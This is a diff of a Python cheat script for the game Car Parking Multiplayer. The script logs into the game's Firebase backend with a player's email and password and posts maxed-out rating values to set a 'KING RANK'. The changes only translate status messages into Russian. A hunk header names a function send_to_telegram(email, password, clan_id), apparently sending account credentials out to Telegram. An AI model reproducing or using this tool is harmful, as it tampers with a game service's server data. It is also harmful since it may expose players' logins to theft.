@@ -29,7 +29,7 @@ def send_to_telegram(email, password, clan_id):
 
 def login(email, password):
     """Login to CPM using Firebase API."""
-    print("\n🔐 Logging in to CPM1...")
+    print("\n🔐 Вход в систему...")
     payload = {
         "clientType": "CLIENT_TYPE_ANDROID",
         "email": email,
@@ -46,7 +46,7 @@ def login(email, password):
         response_data = response.json()
 
         if response.status_code == 200 and 'idToken' in response_data:
-            print("✅ Login successful!")
+            print("✅ Вход в систему успешен!")
             return response_data.get('idToken')
         else:
             error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
@@ -58,7 +58,7 @@ def login(email, password):
 
 def set_rank(token):
     """Set KING RANK using max rating data."""
-    print("👑 Injecting KING RANK...")
+    print("👑 Выполняется RANG KING...")
     rating_data = {k: 100000 for k in [
         "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
@@ -78,7 +78,7 @@ def set_rank(token):
     try:
         response = requests.post(RANK_URL, headers=headers, json=payload)
         if response.status_code == 200:
-            print("✅ Rank successfully set!")
+            print("✅ Скрипт успешно выполнен!")
             return True
         else:
             print(f"❌ Failed to set rank. HTTP Status: {response.status_code}")
